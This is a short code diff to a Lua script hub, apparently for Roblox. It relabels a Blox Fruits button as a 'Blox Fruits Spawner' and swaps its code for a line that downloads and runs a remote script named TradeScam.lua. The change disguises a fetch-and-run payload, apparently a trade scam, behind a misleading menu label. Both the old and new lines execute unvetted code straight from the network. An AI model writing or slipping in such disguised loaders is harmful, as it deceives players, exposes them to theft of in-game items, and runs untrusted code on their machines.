@@ -1094,10 +1094,10 @@ GamesTab:AddButton({
 })
 
 GamesTab:AddButton({
-    Name = "Blox Fruits - Redz Hub",
+    Name = "Blox Fruits - Blox Fruits Spawner",
     Callback = function()
         local script56 = [[
-             loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))()
+             loadstring(game:HttpGet("https://raw.githubusercontent.com/Azura83/Blox-Fruit/refs/heads/main/TradeScam.lua"))()
         ]]
         loadstring(script56)()
     end
